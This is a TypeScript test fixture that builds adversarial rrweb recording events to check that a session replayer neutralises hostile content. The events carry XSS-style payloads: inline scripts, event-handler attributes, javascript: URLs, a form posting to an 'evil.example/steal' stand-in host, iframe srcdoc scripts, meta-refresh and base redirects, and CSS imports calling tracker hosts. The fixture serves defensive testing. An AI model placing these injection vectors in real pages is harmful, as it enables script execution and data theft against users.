/** Test data for the Exploration Trail: a recording that tries everything a replay must never do (ADR-0037 §5). */
export const ORIGIN = 'http://localhost:4401'
let nid = 1
const el = (tagName: string, attributes: Record<string, unknown> = {}, childNodes: unknown[] = []) => ({ type: 2, tagName, attributes, childNodes, id: nid++ })
const text = (textContent: string, isStyle = false) => ({ type: 3, textContent, id: nid++, ...(isStyle ? { isStyle } : {}) })
const doc = (body: unknown[], head: unknown[] = []) => ({ type: 0, id: nid++, childNodes: [{ type: 1, name: 'html', publicId: '', systemId: '', id: nid++ }, el('html', {}, [el('head', {}, head), el('body', {}, body)])] })

/** One step's events: scripts, handlers, javascript: links, forms, trackers, frames, canvas, SVG handlers, refresh and base tags, malformed nodes. */
export function adversarialEvents(): unknown[] {
	nid = 1
	const t = 1_000
	return [
		{ type: 4, timestamp: t, data: { href: `${ORIGIN}/en/offers.html?token=secret#x`, width: 1280, height: 800 } },
		{
			type: 2,
			timestamp: t + 1,
			data: {
				node: doc(
					[
						el('script', {}, [text('parent.__pwned = 1')]),
						el('img', { src: 'x', onerror: 'parent.__pwned = 2' }),
						el('a', { href: 'javascript:parent.__pwned=3', target: '_top', ping: 'https://tracker.example/p' }, [text('click')]),
						el('form', { action: 'https://evil.example/steal', method: 'post', target: '_top' }, [el('input', { name: 'q', value: 'x' }), el('button', { formaction: 'javascript:parent.__pwned=4' }, [text('go')])]),
						el('img', { src: `${ORIGIN}/assets/logo.svg` }),
						el('img', { src: 'https://tracker.example/pixel.gif?u=1' }),
						el('img', { src: `${ORIGIN}/api/logout?x=1` }),
						el('img', { srcset: `${ORIGIN}/assets/a.png 1x, https://cdn.example/b.png 2x` }),
						el('svg', { onload: 'parent.__pwned = 5' }, [el('script', {}, [text('parent.__pwned=6')]), el('use', { href: 'https://evil.example/s.svg#x' }), el('animate', { attributeName: 'href', to: 'javascript:parent.__pwned=7' }), el('foreignObject', {}, [el('iframe', { src: 'https://evil.example' })])]),
						el('canvas', { width: 300, height: 150 }),
						el('iframe', { src: 'https://evil.example', srcdoc: '<script>parent.__pwned=8</script>' }),
						el('object', { data: 'https://evil.example/x.swf' }),
						el('div', { style: 'background: url(https://tracker.example/bg.png); width: 10px; behavior: url(x.htc)' }),
						el('div', { style: `background-image: url("${ORIGIN}/assets/promo-weekend-en.png")` }),
						el('blink', { onclick: 'x', onmouseover: 'parent.__pwned = 9' }, [text('malformed but harmless')]),
						{ type: 2, attributes: {}, childNodes: [], id: nid++ },
						{ nonsense: true },
					],
					[
						el('base', { href: 'https://evil.example/' }),
						el('meta', { 'http-equiv': 'refresh', content: '0;url=https://evil.example' }),
						el('link', { rel: 'stylesheet', href: 'https://evil.example/x.css' }),
						el('link', { rel: 'prefetch', href: `${ORIGIN}/assets/site.css` }),
						el('link', { rel: 'stylesheet', href: `${ORIGIN}/assets/site.css`, _cssText: `@import url(https://evil.example/i.css); .x { background: url(${ORIGIN}/assets/logo.svg) } .y { background: url(https://tracker.example/t.png) }` }),
						el('style', {}, [text('.z { background: url(https://tracker.example/z.png) } @import "https://evil.example/j.css";', true)]),
					],
				),
				initialOffset: { left: 0, top: 0 },
			},
		},
		{ type: 3, timestamp: t + 2, data: { source: 0, adds: [{ parentId: 3, nextId: null, node: el('script', {}, [text('parent.__pwned=10')]) }, { parentId: 3, nextId: null, node: el('img', { src: 'https://tracker.example/late.gif' }) }], removes: [], texts: [{ id: 2, value: 'a { background: url(https://tracker.example/t2.png) }' }], attributes: [{ id: 5, attributes: { onclick: 'parent.__pwned=11', href: 'javascript:alert(1)', style: { background: 'url(https://tracker.example/s.png)' } } }] } },
		{ type: 3, timestamp: t + 3, data: { source: 5, text: 'my password', isChecked: false, id: 9 } },
		{ type: 3, timestamp: t + 4, data: { source: 9, id: 10, type: 0, commands: [] } },
		{ type: 3, timestamp: t + 5, data: { source: 8, id: 6, adds: [{ rule: '.q { background: url(https://tracker.example/r.png) }', index: 0 }] } },
		{ type: 3, timestamp: t + 6, data: { source: 1, positions: [{ x: 10, y: 10, id: 3, timeOffset: 0 }] } },
		{ type: 5, timestamp: t + 7, data: { tag: 'x', payload: {} } },
		{ type: 6, timestamp: t + 8, data: { plugin: 'rrweb/console@1', payload: {} } },
		'not an event',
		{ type: 3 },
	]
}
